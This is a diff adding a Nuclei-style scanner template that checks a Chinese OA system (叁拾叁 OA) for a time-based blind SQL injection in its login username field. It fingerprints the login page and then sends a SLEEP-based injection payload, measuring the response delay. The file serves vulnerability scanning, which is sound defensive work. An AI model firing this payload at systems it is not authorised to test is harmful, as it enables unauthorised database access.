@@ -1,0 +1,48 @@
+id: poc-yaml-33iot-oa-username-sqli
+info:
+  name: 叁拾叁OA username SQL注入漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  description: |
+    This template detects a SQL Injection vulnerability in the username field of the 叁拾叁 OA system.
+
+variables:
+  t1: "{{rand_int(4,9)}}"
+  t2: "{{to_number(t1) + 2}}"
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/login.jsp"
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "江苏叁拾叁"
+        part: body
+
+  - method: POST
+    path:
+      - "{{BaseURL}}/login"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: "username=1'+AND+(SELECT+4935+FROM+(SELECT(SLEEP({{t1}})))tHaE)+AND+'pyTD'='pyTD&password=1"
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 302
+      - type: word
+        words:
+          - ""
+        part: body
+      - type: dsl
+        dsl:
+          - "duration > to_number(t1)"
+          - "duration < to_number(t2)"
